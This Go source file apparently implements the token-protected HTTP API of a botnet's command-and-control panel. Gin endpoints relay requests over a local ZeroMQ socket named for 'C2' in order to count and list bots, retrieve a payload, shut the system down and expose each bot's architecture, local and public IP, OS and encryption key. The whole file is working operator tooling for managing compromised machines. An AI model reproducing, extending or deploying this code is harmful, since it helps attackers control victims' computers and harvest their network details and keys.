package main

import (
	"database/sql"
	"log"
	"net/http"
	initdb "terylene/webserver/initDB"
	"time"

	"github.com/gin-gonic/gin"
	_ "github.com/mattn/go-sqlite3"
	zmq "github.com/pebbe/zmq4"
)

const (
	port       = "80"          //you can change the port
	dbPath     = "zeroAPI.db"  // you can replace this with your desired database file path
	tableName  = "auth_tokens" // dont change !!!
	createStmt = `
		CREATE TABLE IF NOT EXISTS auth_tokens (
			token TEXT PRIMARY KEY
		);
	`
	checktokencount = "SELECT COUNT(*) FROM auth_tokens"
	checktoken      = "SELECT COUNT(*) FROM auth_tokens WHERE token=?"
	ANSIgreen       = "\033[32m"
	ANSIred         = "\033[31m"
	ANSIesc         = "\033[0m"
)

func checkvalue(db *sql.DB) bool {
	var result int
	err := db.QueryRow(checktokencount).Scan(&result)
	if err != nil {
		log.Fatal(err)
	}
	return result > 0
}

func tableExists(db *sql.DB, tableName string) bool {
	var result int
	err := db.QueryRow("SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name=?", tableName).Scan(&result)
	if err != nil {
		log.Fatal(err)
	}
	return result > 0
}

func C2Call(zcon *zmq.Context, args ...interface{}) []string {
	req, err := zcon.NewSocket(zmq.REQ)
	defer req.Close()

	if err != nil {
		log.Println(err)
	}

	req.SetRcvtimeo(time.Second * 3)
	req.Connect("ipc:///tmp/ZeroCall")
	req.SendMessage(args...)

	result, err := req.RecvMessage(0)

	return result
}

func main() {
	err := initdb.InitDB()
	if err != nil {
		log.Printf("Error initializing database: %v\n", err)
		return
	}
	log.Println("Database initialized")

	router := gin.Default()

	db, err := sql.Open("sqlite3", dbPath)
	if err != nil {
		log.Fatalln(err)
	}

	zcon, err := zmq.NewContext()

	router.GET("/GetBotsOnline", func(c *gin.Context) {
		GetBotsOnline(c, db, zcon)
	})

	router.GET("/GetBotslist", func(c *gin.Context) {
		GetBotslist(c, db, zcon)
	})

	router.GET("/Uptime", func(c *gin.Context) {
		Uptime(c, db, zcon)
	})

	router.GET("/shutdown", func(c *gin.Context) {
		shutdown(c, db, zcon)
	})

	router.GET("/GetInfo", func(c *gin.Context) {
		GetInfo(c, db, zcon)
	})

	router.GET("/Getpayload", func(c *gin.Context) {
		Getpayload(c, db, zcon)
	})

	router.NoRoute(func(c *gin.Context) {
		c.File("./static/APIinfo.txt")
	})

	router.Run(":80")
}

func authenticateToken(c *gin.Context, token string, db *sql.DB) bool {
	if token == "" || len(token) != 32 {
		c.JSON(http.StatusUnauthorized, gin.H{
			"error": "No/Invalid API key",
		})
		return false
	}

	var result int
	err := db.QueryRow(checktoken, token).Scan(&result)
	if err != nil {
		log.Println(err)

		c.JSON(http.StatusInternalServerError, gin.H{
			"error": "Internal Database error",
		})

		return false
	}

	if result > 0 {
		return true
	} else {
		c.JSON(http.StatusUnauthorized, gin.H{
			"error": "Invalid API key",
		})
		return false
	}
}

func GetBotsOnline(c *gin.Context, db *sql.DB, zcon *zmq.Context) {
	token := c.Query("token")

	allow := authenticateToken(c, token, db)

	if allow {
		result := C2Call(zcon, "GetBotsOnline")
		c.JSON(http.StatusOK, gin.H{
			"result": result[0],
		})
	}
}

func GetBotslist(c *gin.Context, db *sql.DB, zcon *zmq.Context) {
	token := c.Query("token")

	allow := authenticateToken(c, token, db)

	if allow {
		result := C2Call(zcon, "GetBotslist")
		c.JSON(http.StatusOK, gin.H{
			"result": result,
		})
	}
}

func Getpayload(c *gin.Context, db *sql.DB, zcon *zmq.Context) {
	token := c.Query("token")

	allow := authenticateToken(c, token, db)

	if allow {
		result := C2Call(zcon, "Getpayload")
		c.JSON(http.StatusOK, gin.H{
			"result": result[0],
		})
	}
}

func Uptime(c *gin.Context, db *sql.DB, zcon *zmq.Context) {
	token := c.Query("token")

	allow := authenticateToken(c, token, db)

	if allow {
		result := C2Call(zcon, "Uptime")
		c.JSON(http.StatusOK, gin.H{
			"result": result[0],
		})
	}
}

func GetInfo(c *gin.Context, db *sql.DB, zcon *zmq.Context) {
	token := c.Query("token")
	botId := c.Query("ID")
	if botId == "" {
		c.JSON(http.StatusOK, gin.H{
			"result": "No ID",
		})
		return
	}
	allow := authenticateToken(c, token, db)

	if allow {
		result := C2Call(zcon, "GetInfo", botId)
		if len(result) == 1 {
			c.JSON(http.StatusOK, gin.H{
				"result": result[0],
			})
		} else {
			log.Println(result)
			c.JSON(http.StatusOK, gin.H{
				"result": gin.H{
					"arch":           result[0],
					"local ip":       result[1],
					"public ip":      result[2],
					"OS":             result[3],
					"encryption key": result[4],
				},
			})
		}
	}
}

func shutdown(c *gin.Context, db *sql.DB, zcon *zmq.Context) {
	token := c.Query("token")

	allow := authenticateToken(c, token, db)

	if allow {
		result := C2Call(zcon, "shutdown")

		c.JSON(http.StatusOK, gin.H{
			"result": result[0],
		})
	}
}
